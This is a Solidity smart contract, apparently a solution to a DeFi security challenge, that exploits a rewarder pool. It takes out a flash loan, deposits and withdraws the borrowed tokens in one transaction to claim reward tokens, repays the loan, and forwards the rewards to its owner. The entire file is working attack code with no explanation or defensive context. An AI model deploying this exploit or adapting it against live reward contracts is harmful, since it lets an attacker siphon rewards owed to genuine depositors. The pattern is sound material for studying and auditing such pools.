pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFLashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

contract FlashLoanAttack {

    IFLashLoanerPool pool;
    IRewarderPool rewarderPool;
    address owner;
    address liquidityTokenAddress;
    address rewardTokenAddress;

    constructor(address flashLoanPoolAddress, address rewarderPoolAddress, address _liquidityTokenAddress, address _rewardTokenAddress) {
        pool = IFLashLoanerPool(flashLoanPoolAddress);
        rewarderPool = IRewarderPool(rewarderPoolAddress);
        owner = msg.sender;
        liquidityTokenAddress = _liquidityTokenAddress;
        rewardTokenAddress = _rewardTokenAddress;
    }

    function receiveFlashLoan(uint256 amount) external {
        IERC20(liquidityTokenAddress).approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        require(IERC20(liquidityTokenAddress).transfer(msg.sender, amount), "Transfer of tokens failed");
        IERC20(rewardTokenAddress).transfer(owner, IERC20(rewardTokenAddress).balanceOf(address(this)));
    }

    function executeFlashLoan(uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(amount);
    }

}
